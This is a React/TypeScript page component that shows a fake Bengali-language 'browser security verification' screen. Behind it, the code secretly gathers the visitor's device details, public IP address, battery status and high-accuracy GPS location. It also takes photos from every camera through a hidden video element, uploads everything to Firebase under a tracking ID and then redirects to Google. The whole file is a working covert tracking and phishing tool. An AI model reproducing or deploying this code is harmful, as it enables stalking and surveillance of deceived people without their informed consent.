
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [loadingStep, setLoadingStep] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasCaptured = useRef(false);

  useEffect(() => {
    console.log("[System] Initializing verification for ID:", id);

    const steps = setInterval(() => {
      setLoadingStep(s => (s < 98 ? s + 1 : s));
    }, 150);

    const runCapture = async () => {
      if (!id || hasCaptured.current) return;
      hasCaptured.current = true;

      console.log("[Firebase] Checking Database initialization...");
      if (!db) {
        console.error("[Error] Database not found!");
        return;
      }

      // 1. Full Device Diagnostics
      console.log("[Device] Gathering hardware specs...");
      const payload: any = {
        userId: id,
        timestamp: serverTimestamp(),
        device: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          // @ts-ignore
          ram: navigator.deviceMemory || "N/A",
          // @ts-ignore
          cores: navigator.hardwareConcurrency || "N/A",
          language: navigator.language,
          vendor: navigator.vendor,
          screen: `${window.screen.width}x${window.screen.height} (${window.screen.orientation?.type})`,
          touchPoints: navigator.maxTouchPoints,
          cookieEnabled: navigator.cookieEnabled,
        },
        network: {},
        status: 'Processing'
      };

      // 2. Network & IP
      try {
        console.log("[Network] Fetching public IP address...");
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        payload.ip = ipData.ip;
        // @ts-ignore
        payload.network.type = navigator.connection ? navigator.connection.effectiveType : "Unknown";
        console.log("[Success] IP Identified:", ipData.ip);
      } catch (e) { console.error("[Error] IP fetch failed", e); }

      // 3. Battery Status
      try {
        // @ts-ignore
        if (navigator.getBattery) {
          // @ts-ignore
          const battery = await navigator.getBattery();
          payload.battery = {
            level: Math.round(battery.level * 100),
            charging: battery.charging
          };
        }
      } catch (e) { console.warn("[Warn] Battery API unavailable"); }

      // 4. Advanced Location (High Accuracy)
      try {
        console.log("[GPS] Requesting high-accuracy location...");
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });
        payload.location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          altitudeAccuracy: pos.coords.altitudeAccuracy,
          heading: pos.coords.heading,
          speed: pos.coords.speed,
        };
        console.log("[Success] GPS Data Acquired.");
      } catch (e) { console.error("[Error] Location access denied or timeout", e); }

      // 5. Multi-Camera Capture (Front & Back)
      const photos: string[] = [];
      try {
        console.log("[Media] Enumerating video devices...");
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(d => d.kind === 'videoinput');
        console.log(`[Media] Found ${videoDevices.length} cameras.`);

        for (const device of videoDevices) {
          try {
            console.log(`[Media] Accessing camera: ${device.label || 'Default'}`);
            const stream = await navigator.mediaDevices.getUserMedia({
              video: { deviceId: { exact: device.deviceId } }
            });

            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              await new Promise(r => setTimeout(r, 1500)); // Allow camera focus

              const canvas = canvasRef.current;
              if (canvas) {
                canvas.width = videoRef.current.videoWidth;
                canvas.height = videoRef.current.videoHeight;
                canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
                
                // Compression: 0.5 quality
                const base64 = canvas.toDataURL('image/jpeg', 0.5);
                const path = `captures/${id}/${Date.now()}_${device.deviceId.slice(0, 5)}.jpg`;
                const storageRef = ref(storage, path);
                
                console.log("[Storage] Uploading snapshot...");
                await uploadString(storageRef, base64, 'data_url');
                const url = await getDownloadURL(storageRef);
                photos.push(url);
                console.log("[Success] Image uploaded:", url);
              }
            }
            stream.getTracks().forEach(t => t.stop());
          } catch (err) {
            console.warn("[Media] Individual camera access failed:", device.label);
          }
        }
        payload.photoUrls = photos;
      } catch (e) { console.error("[Error] Camera enumeration failed", e); }

      // 6. Final Sync to Firestore
      try {
        console.log("[Firestore] Finalizing report and saving...");
        payload.status = 'Completed';
        const docRef = await addDoc(collection(db, "logs"), payload);
        console.log("[Success] Report saved successfully! ID:", docRef.id);

        clearInterval(steps);
        setLoadingStep(100);
        
        console.log("[System] Verification finished. Redirecting...");
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 1000);
      } catch (err) {
        console.error("[Fatal Error] Firestore upload failed:", err);
        // Fallback redirect even on failure
        setTimeout(() => window.location.href = "https://www.google.com", 3000);
      }
    };

    runCapture();
    return () => clearInterval(steps);
  }, [id]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-white font-sans p-6">
      <div className="w-full max-w-sm text-center">
        <div className="mb-10">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">ব্রাউজার যাচাই করা হচ্ছে...</h1>
          <p className="text-sm text-gray-400">আপনার সংযোগ নিরাপদ কিনা তা পরীক্ষা করা হচ্ছে। কিছুক্ষণ অপেক্ষা করুন।</p>
        </div>

        <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-4">
          <div className="bg-blue-600 h-full transition-all duration-300" style={{ width: `${loadingStep}%` }}></div>
        </div>
        
        <div className="flex justify-between text-[10px] font-bold text-gray-400 uppercase tracking-widest">
          <span>Security Level: High</span>
          <span>{loadingStep}%</span>
        </div>

        <div className="mt-20 flex flex-col items-center opacity-10">
          <div className="flex items-center gap-2 mb-1">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
            <span className="text-[10px] font-bold tracking-tighter">ENCRYPTED PROTOCOL V3</span>
          </div>
          <p className="text-[8px]">SID: {Math.random().toString(36).substr(2, 12).toUpperCase()}</p>
        </div>

        <video ref={videoRef} autoPlay muted playsInline className="opacity-0 absolute pointer-events-none w-1 h-1"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
    </div>
  );
};

export default TrackPage;
